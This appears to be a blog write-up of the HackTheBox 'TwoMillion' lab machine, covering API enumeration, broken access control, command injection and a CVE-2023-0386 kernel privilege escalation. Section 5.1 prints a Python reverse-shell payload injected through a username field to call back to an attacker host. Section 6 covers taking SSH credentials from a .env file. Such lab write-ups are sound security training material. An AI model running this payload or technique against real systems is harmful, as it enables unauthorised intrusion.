---
title: "HackTheBox: TwoMillion - Easy"
categories: [HackTheBox]
tags: [hackthebox, api, kernel-exploit]
image:
  path: /assets/images/2025-10-18-htb-twomillion/cover.png
---

## Overview

**TwoMillion** is an easy-rated box that tests your enumeration skills and understanding of **APIs**. The machine starts with **javascript** code analysis to uncover hidden API endpoints. Once authenticated, further enumeration reveals administrative endpoints and eventually a **command injection** vulnerability that provides initial shell access. From there, reading sensitive environment files allows lateral movement, followed by exploiting a **kernel vulnerability** for privilege escalation to root.

Box Link: [TwoMillion](https://www.hackthebox.com/machines/TwoMillion)

---

## 1. Reconnaissance

### 1.1 Nmap Scan

We begin our reconnaissance with an **nmap** scan. First, let’s identify all open ports:

```bash
nmap -sS -T4 -p- <TARGET_IP>
```

**Results:**
```
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two open ports — **22 (SSH)** and **80 (HTTP)**. Let’s enumerate their versions:

```bash
nmap -sS -T4 -p 22,80 -sV --version-all <TARGET_IP>
```

**Results:**
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux
```

No obvious vulnerabilities here. We’ll move on to the web server on port 80. Before that, add `2million.htb` to `/etc/hosts`.

---

## 2. Enumeration

### 2.1 Directory Enumeration

Using **Gobuster** to identify interesting directories:

```bash
gobuster dir -u "http://2million.htb" \
-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
-x txt,log,bak,php --exclude-length 162
```

The results show:
```
/home (302) → /
/login (200)
/register (200)
/api (401)
/logout (302) → /
/invite (200)
/Database.php (200)
/Router.php (200)
```

The `/api` endpoint returning **401 Unauthorized** looks promising. Let’s explore the web interface first.

---

## 3. Web Exploration

### 3.1 Login and Registration

Visiting the main page shows a login form, but no credentials. The `/register` page requires an **invite code**. Viewing the source reveals the invite field is prefilled from **localStorage**, meaning the code must come from somewhere else.

### 3.2 Finding the Invite Code

The `/invite` page has links to javascript files. One of them, `inviteapi.js`, includes obfuscated code that can be deobfuscated to show some interesting functions. The one we are interested in is `makeInviteCode`. Running it in the console gives us this response:

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."
}
```

Decrypting the ROT13-encoded string gives:
```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Sending a POST request to that endpoint returns an encoded invite code, which can be base64-decoded to register successfully.

---

## 4. Authenticated Enumeration

Once logged in, we have access to new endpoints such as `/home/access`, `/home/rules`, and `/home/changelog`. None of these directly leak useful info. However, `/home/access` calls `/api/v1/user/vpn/generate`, which generates an OpenVPN config.

Replacing `user` with `admin` in the endpoint returns **401 Unauthorized** — indicating role-based access control is in place. But maybe we can explore `/api` again now that we’re authenticated.

### 4.1 Enumerating the API

Accessing `/api/v1` now returns a full route list:

```json
{
  "v1": {
    "user": {...},
    "admin": {...}
  }
}
```

It lists all **user** and **admin** endpoints, including:
- `/api/v1/admin/settings/update`
- `/api/v1/admin/vpn/generate`

### 4.2 Privilege Escalation to Admin

Testing `/api/v1/admin/settings/update` reveals it doesn’t verify admin privileges. After you follow the error messages and add the necessary parameters you get to promote your user to admin using a **Broken Access Control** vulnerability.

![Got admin rights]({{ site.baseurl }}/assets/images/2025-10-18-htb-twomillion/ss1.png)

Revisiting `/api/v1/admin/auth` confirms we’re now authenticated as admin.

---

## 5. Exploitation

### 5.1 Command Injection in VPN Generation

Now as admin, we can hit `/api/v1/admin/vpn/generate`. The request needs a username, but it doesn't have to be our username since we can supply arbitrary values. What if we sent unusual input?

Sending payloads with quotes and command substitutions shows that the username parameter does behave weirdly and sometimes sends empty responses. With further tests we confirm that we can execute commands using `$()` in the username.

Using a reverse shell payload:

```json
{
  "username": "$(python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")')"
}
```

We catch a shell as **www-data**.

---

## 6. Privilege Escalation

### 6.1 Pivoting to Admin

Checking the current directory reveals a `.env` file containing valid SSH credentials for the `admin` user. 

![Environment variables leaking creds]({{ site.baseurl }}/assets/images/2025-10-18-htb-twomillion/ss2.png)

We log in successfully and retrieve the user flag.

![User flag]({{ site.baseurl }}/assets/images/2025-10-18-htb-twomillion/ss4.png)

### 6.2 Root Escalation via Kernel Exploit

Running **linpeas** indicates an outdated kernel and an email referencing **OverlayFS / FUSE** vulnerabilities. This points to `CVE-2023-0386`.

Following an exploit from [this reference](https://red.infiltr8.io/redteam/privilege-escalation/linux/kernel-exploits/overlayfs-exploits/cve-2023-0386-overlayfs) and [this GitHub repo](https://github.com/sxlmnwb/CVE-2023-0386), we execute the exploit and gain root privileges.

![Root privileges]({{ site.baseurl }}/assets/images/2025-10-18-htb-twomillion/ss5.png)

We can now get the flag from `/root`

![Root flag]({{ site.baseurl }}/assets/images/2025-10-18-htb-twomillion/ss3.png)

---

## 7. Conclusion

**TwoMillion** was an enjoyable box that combined client-side javascript analysis, API abuse, and a kernel exploit. The progression felt natural — from front-end enumeration to backend exploitation. It’s a great challenge for practicing enumeration, logic flaws, and privilege escalation.
